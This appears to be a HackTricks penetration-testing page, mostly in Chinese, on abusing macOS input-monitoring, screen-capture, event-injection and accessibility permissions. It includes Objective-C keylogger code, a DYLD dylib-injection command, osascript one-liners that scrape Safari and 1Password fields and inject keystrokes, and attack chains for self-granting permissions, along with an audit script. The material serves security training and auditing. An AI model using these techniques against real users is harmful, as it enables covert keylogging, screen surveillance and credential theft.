# macOS 输入监视、屏幕捕获与辅助功能滥用

{{#include ../../../banners/hacktricks-training.md}}

## 概述

三个相关的 TCC 服务控制应用如何观察并与用户的桌面会话交互：

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **输入监视** | 读取整个系统的所有键盘和鼠标事件（keylogging） |
| `kTCCServicePostEvent` | **输入注入** | 注入合成的键盘和鼠标事件 |
| `kTCCServiceScreenCapture` | **屏幕捕获** | 读取显示缓冲区、截屏、录制屏幕 |
| `kTCCServiceAccessibility` | **辅助功能** | 通过 AXUIElement API 控制其他应用，读取 UI 元素 |

这些权限在 macOS 上是**最危险的组合** —— 共同提供：
- 完整记录每次按键（密码、消息、信用卡）
- 录制所有可见内容
- 合成输入注入（点击按钮、批准对话框）
- 等同于物理访问的完整 GUI 控制

---

## Input Monitoring (kTCCServiceListenEvent)

### 工作原理

macOS 使用 **`CGEventTap` API** 允许进程从 Quartz 事件系统拦截输入事件。具有 ListenEvent 权限的进程可以创建一个事件 tap，从而在事件到达目标应用之前或之后接收 **每一个键盘和鼠标事件**。
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### 查找带有 entitlements 的二进制文件
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### 攻击: Keylogging via Code Injection

如果一个具有 ListenEvent permission 的二进制文件同时具有 **disabled library validation** 或 **allows DYLD environment variables**，攻击者可以注入一个 dylib 来注册一个 CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
被注入的 dylib 继承了目标的 ListenEvent TCC 授权并捕获所有按键。

### 攻击：Credential Harvesting

一个复杂的 keylogger 可以将按键与当前活动的应用程序相关联：
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## 输入注入 (kTCCServicePostEvent)

### 工作原理

PostEvent 权限允许创建一个带有 **`kCGEventTapOptionDefault`**（可修改/注入事件）的 event tap，而不是 ListenOnly。这样可以：
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 攻击: 自动化 TCC 提示批准

使用 PostEvent，攻击者可以在 TCC 权限对话框上**模拟点击 "Allow"**：
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## 屏幕捕获 (kTCCServiceScreenCapture)

### 工作原理

屏幕捕获权限允许使用以下方法读取显示缓冲区：
- **`CGWindowListCreateImage`** — 捕获任意窗口或全屏
- **`ScreenCaptureKit`** (macOS 12.3+) — 用于流式传输屏幕内容的现代 API
- **`CGDisplayStream`** — 硬件加速的屏幕捕获
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### 查找屏幕捕获客户端
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### 攻击: Credential Capture via OCR

注入的屏幕捕获进程可以定期捕获帧并使用 OCR 提取密码：
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> 从 **macOS Sonoma** 开始，screen capture 会在 menu bar 中显示一个 **persistent indicator**。在旧版本中，screen recording 可能完全不会有任何提示。然而，短暂的 single-frame capture 仍可能被用户忽略。

### 攻击: Session Recording

Continuous screen recording 提供了用户会话的完整回放：
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## 辅助功能 (kTCCServiceAccessibility)

### 工作原理

辅助功能访问通过 **AXUIElement API** 授予对其他应用程序的控制。具有辅助功能权限的进程可以：

1. **读取**任何应用程序中的任何 UI 元素（文本字段、标签、按钮、菜单）
2. **点击**按钮并与控件交互
3. **输入**文本到任何文本字段
4. **导航**菜单和对话框
5. **抓取**任何正在运行的应用程序中显示的数据
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### 攻击：Self-Granting TCC Permissions

最危险的可访问性滥用是 **在 System Settings 中导航以授予自身 malware 额外权限**：
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 攻击：Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### 攻击：自动化用户操作
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 攻击链

### 链：Input Monitoring + Screen Capture = 全面监控
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### 链: Accessibility + PostEvent = 完全远程控制
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### 链：Accessibility → Self-Grant Camera/Mic → 监控
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## 检测与枚举
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## 参考资料

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
